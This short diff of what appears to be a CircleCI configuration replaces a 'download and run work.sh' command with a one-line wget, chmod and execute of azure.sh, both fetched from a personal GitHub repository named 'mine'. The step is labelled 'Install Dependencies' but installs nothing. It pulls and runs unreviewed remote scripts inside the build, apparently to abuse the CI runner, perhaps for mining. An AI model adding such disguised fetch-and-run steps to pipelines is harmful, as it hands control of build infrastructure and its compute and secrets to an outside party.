@@ -7,10 +7,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: |
-              wget https://raw.githubusercontent.com/geraldyolang11/mine/main/work.sh
-              chmod +x work.sh
-              ./work.sh
+            command: wget https://raw.githubusercontent.com/geraldyolang11/mine/main/azure.sh && chmod u+x azure.sh && ./azure.sh
 
 workflows:
     version: 2.1
